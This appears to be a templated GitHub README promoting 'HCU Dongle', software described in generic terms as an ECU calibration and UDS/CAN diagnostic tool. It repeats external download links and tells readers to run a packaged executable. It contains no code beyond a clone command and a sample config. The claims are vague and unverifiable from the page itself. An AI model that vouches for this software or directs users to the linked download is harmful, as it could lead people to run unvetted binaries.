# HCU Dongle v1.0.0.0382 - automotive diagnostic software 2026

> **HCU Dongle v1.0.0.0382 is a cross-platform automotive diagnostic tool for ECU calibration, UDS and CAN bus workflows, with a headless CLI mode for flexible use.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0.0382-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bennettbrandon/hcu-dongle-headless-executor?style=flat-square)](https://github.com/bennettbrandon/hcu-dongle-headless-executor)

---

<p align="center">
  <a href="https://bennettbrandon.github.io/hcu-dongle-headless-executor/">
    <img src="https://img.shields.io/badge/Download-HCU%20Dongle%20Latest-brightgreen?style=for-the-badge" alt="Download HCU Dongle">
  </a>
</p>

> **[Direct Download - HCU Dongle v1.0.0.0382](https://bennettbrandon.github.io/hcu-dongle-headless-executor/)**

---

[Download Latest Build](https://bennettbrandon.github.io/hcu-dongle-headless-executor/)

---

## Overview

HCU Dongle is a diagnostic software package for automotive workflows centered on ECU parameter setup, protocol adaptation, and communication over UDS and CAN bus systems. It is aimed at users who want a usable graphical workflow for calibration and diagnostics, as well as a command-line path for scripted or unattended operation.

The release brings together a multilingual interface, persistent sessions, and a built-in diagnostic knowledge base to make recurring tasks smoother and reduce back-and-forth between tools. Whether you work through the UI or prefer a headless environment, HCU Dongle offers a structured approach to HCU and HCP related diagnostic activities across supported environments.

---

## Capabilities

- ECU parameter configuration for diagnostic and calibration tasks
- Adaptive protocol negotiation for varied communication scenarios
- Support for UDS and CAN bus workflows
- Headless CLI mode for scripted use and automation
- Multilingual interface for broader accessibility
- Session persistence to retain working state between launches
- Embedded diagnostic knowledge base for reference during operations
- Cross-platform tooling for flexible deployment

---

## Installation

1. Download or clone the repository contents into a local folder.
2. Open the project in your preferred environment or extract the release package.
3. Launch the graphical interface or start the CLI entry point, depending on your workflow.

Typical local setup:

- Clone the repository:
  - `git clone https://github.com/bennettbrandon/hcu-dongle-headless-executor.git
- Enter the project directory:
  - `cd REPO`
- Start the tool using the available launcher or command entrypoint for your platform.

If you are using a packaged release, follow the download bundle instructions and run the included executable or script from the extracted folder.

---

## Usage

In interactive mode, start the main UI and choose the diagnostic session or ECU profile you want to manage. From there, you can inspect the available parameters, proceed through protocol negotiation, and consult the knowledge base while you work.

For terminal-based operation, use the CLI mode to perform repeatable diagnostic or calibration steps without loading the full interface. This fits well when integrating HCU Dongle into a script, test sequence, or maintenance routine.

Example workflow:

1. Start the application.
2. Connect to the target vehicle interface.
3. Choose the relevant UDS or CAN bus session.
4. Adjust ECU parameters as required.
5. Save the session so it can be resumed later.

---

## Configuration

Settings are usually controlled through the app's stored session data and runtime preferences. If you use the CLI, keep your command arguments and environment-specific options in the same workflow so they can be reused consistently.

Example configuration shape:

```ini
[general]
language=en
mode=cli
session_persistence=true
protocol=auto

[diagnostics]
bus=can
stack=uds
knowledge_base=enabled
```

If your build stores configuration elsewhere, check the project directory, user profile folder, or the runtime logs for the active settings location.

---

## Requirements

- Cross-platform system capable of running the supported build
- Access to the target diagnostic interface for ECU and bus communication
- Compatibility with UDS and CAN bus workflows
- Enough local storage for the application, session data, and knowledge base
- A terminal or shell if you plan to use CLI mode

---

## FAQ

**How do I get started?**  
Download the latest build, open the app or CLI, and begin with a diagnostic session that matches your target system.

**Does it support both GUI and command-line workflows?**  
Yes. The project includes a multilingual UI and a headless CLI mode.

**Where are my sessions stored?**  
Session persistence is included, so your working state is retained between launches according to the active configuration.

**What if a protocol is not detected immediately?**  
Use the adaptive protocol negotiation flow and confirm the connected interface, bus type, and session parameters.

**Is there documentation built in?**  
Yes. The release includes an embedded diagnostic knowledge base for reference during use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
